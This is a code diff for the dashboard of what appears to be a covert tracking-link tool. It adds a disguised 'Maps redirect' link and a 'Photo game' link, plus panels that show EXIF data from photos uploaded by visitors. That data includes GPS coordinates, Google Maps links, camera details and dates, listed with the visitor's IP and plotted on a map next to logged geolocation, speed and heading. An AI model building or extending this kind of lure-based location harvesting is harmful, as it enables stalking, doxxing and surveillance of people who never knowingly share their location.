@@ -364,6 +364,11 @@
     .hidden { display: none !important; }
     .loading-text { color: var(--text-muted); text-align: center; padding: 2rem; }
 
+    .exif-photos { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 0.75rem; }
+    .exif-thumb { width: 60px; height: 60px; border-radius: 6px; object-fit: cover; border: 1px solid var(--border); cursor: pointer; transition: transform 0.15s; }
+    .exif-thumb:hover { transform: scale(1.1); }
+    .exif-gps-badge { background: var(--success); color: #000; font-size: 0.65rem; padding: 0.1rem 0.4rem; border-radius: 4px; font-weight: 600; margin-left: 0.5rem; }
+
     @media (max-width: 640px) {
       .form-row { flex-direction: column; }
       .link-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
@@ -560,7 +565,8 @@
             <span style="color:var(--text-muted);font-size:0.75rem">${timeAgo(l.createdAt)}</span>
             <span class="link-clicks">${l.visitCount} clicks</span>
             <div class="link-actions" onclick="event.stopPropagation()">
-              <button class="btn btn-ghost btn-sm" onclick="copyTrackingUrl('${l.id}')">Copy</button>
+              <button class="btn btn-ghost btn-sm" onclick="copyTrackingUrl('${l.id}','r')" title="Maps redirect link">📍 Copy</button>
+              <button class="btn btn-ghost btn-sm" onclick="copyTrackingUrl('${l.id}','g')" title="Photo game link">📸 Game</button>
               <button class="btn btn-danger btn-sm" onclick="deleteLink('${l.id}')">Del</button>
             </div>
           </div>
@@ -602,10 +608,10 @@
       toast("Copied to clipboard!");
     }
 
-    function copyTrackingUrl(id) {
-      const url = `${window.location.origin}/r/${id}`;
+    function copyTrackingUrl(id, type) {
+      const url = `${window.location.origin}/${type || 'r'}/${id}`;
       navigator.clipboard.writeText(url);
-      toast("Tracking URL copied!");
+      toast(`${type === 'g' ? 'Game' : 'Tracking'} URL copied!`);
     }
 
     async function deleteLink(id) {
@@ -687,6 +693,19 @@
         }
       });
 
+      visits.forEach((v) => {
+        if (v.device?.photos) {
+          v.device.photos.forEach((p) => {
+            if (p.gpsLatitude && p.gpsLongitude) {
+              L.circleMarker([p.gpsLatitude, p.gpsLongitude], {
+                radius: 7, fillColor: "#f59e0b", color: "#fff", weight: 1.5, fillOpacity: 0.85,
+              }).bindPopup(`Photo: ${p.fileName || "Unknown"}<br>${p.dateTimeOriginal || ""}<br>IP: ${v.ip}`).addTo(markersLayer);
+              bounds.push([p.gpsLatitude, p.gpsLongitude]);
+            }
+          });
+        }
+      });
+
       if (bounds.length) {
         map.fitBounds(bounds, { padding: [30, 30], maxZoom: 12 });
       }
@@ -762,6 +781,39 @@
           "Speed": d.geolocation.speed || "-",
           "Heading": d.geolocation.heading || "-",
         });
+      }
+
+      // Photo EXIF data
+      if (d.photos?.length) {
+        let photoHtml = '<div class="detail-section" style="grid-column:1/-1"><h4>Uploaded Photos (' + d.photos.length + ') — EXIF Data</h4>';
+        photoHtml += '<div class="exif-photos">';
+        d.photos.forEach((p) => { if (p.thumbnail) photoHtml += `<img class="exif-thumb" src="${esc(p.thumbnail)}" title="${esc(p.fileName || '')}">` });
+        photoHtml += '</div>';
+        d.photos.forEach((p, i) => {
+          const hasGPS = p.gpsLatitude && p.gpsLongitude;
+          photoHtml += `<div style="margin-bottom:0.75rem;padding:0.5rem;background:rgba(0,0,0,.2);border-radius:6px">`;
+          photoHtml += `<div style="font-weight:600;font-size:0.85rem;margin-bottom:0.4rem">${esc(p.fileName || 'Photo ' + (i + 1))}${hasGPS ? '<span class="exif-gps-badge">GPS</span>' : ''}</div>`;
+          const fields = {};
+          if (hasGPS) { fields["GPS Coordinates"] = `${p.gpsLatitude.toFixed(6)}, ${p.gpsLongitude.toFixed(6)}`; fields["Maps Link"] = `<a href="https://maps.google.com/?q=${p.gpsLatitude},${p.gpsLongitude}" target="_blank" style="color:var(--accent)">Open in Google Maps</a>`; }
+          if (p.gpsAltitude) fields["Altitude"] = `${Math.round(p.gpsAltitude)}m`;
+          if (p.cameraMake) fields["Camera Make"] = p.cameraMake;
+          if (p.cameraModel) fields["Camera Model"] = p.cameraModel;
+          if (p.dateTimeOriginal || p.dateTime) fields["Date Taken"] = p.dateTimeOriginal || p.dateTime;
+          if (p.software) fields["Software"] = p.software;
+          if (p.focalLength) fields["Focal Length"] = `${p.focalLength.toFixed(1)}mm`;
+          if (p.fNumber) fields["Aperture"] = `f/${p.fNumber.toFixed(1)}`;
+          if (p.iso) fields["ISO"] = p.iso;
+          if (p.exposureTime) fields["Exposure"] = p.exposureTime < 1 ? `1/${Math.round(1 / p.exposureTime)}s` : `${p.exposureTime}s`;
+          if (p.imageWidth) fields["Resolution"] = `${p.imageWidth}x${p.imageHeight}`;
+          fields["File Size"] = p.fileSize ? formatBytes(p.fileSize) : "-";
+          fields["Last Modified"] = p.lastModified || "-";
+          for (const [k, val] of Object.entries(fields)) {
+            photoHtml += `<div class="detail-row"><span class="detail-key">${k}</span><span class="detail-val">${k === "Maps Link" ? val : esc(String(val))}</span></div>`;
+          }
+          photoHtml += '</div>';
+        });
+        photoHtml += '</div>';
+        html += photoHtml;
       }
 
       // Client Hints
